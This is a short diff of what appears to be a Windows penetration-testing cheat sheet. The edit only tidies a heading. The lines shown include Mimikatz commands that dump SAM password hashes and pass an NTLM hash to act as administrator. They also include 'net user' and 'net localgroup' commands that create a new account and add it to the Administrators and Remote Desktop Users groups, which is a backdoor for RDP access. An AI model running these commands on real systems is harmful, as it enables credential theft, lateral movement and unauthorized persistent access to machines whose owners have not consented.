@@ -71,9 +71,8 @@ tocke::elevate
 lsadump::sam  
 sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  
 
-#Windows Cr
-# Windows Create New USer for RDP
-``` net user <帳號名稱> <密碼> /add ```
+# Windows Create New USer for RDP  
+``` net user <帳號名稱> <密碼> /add ```  
 ``` net localgroup administrators <帳號名稱> /add ```  
 ``` net localgroup "Remote Desktop Users" <帳號名稱> /add ```  
 ```net localgroup administrators ```  
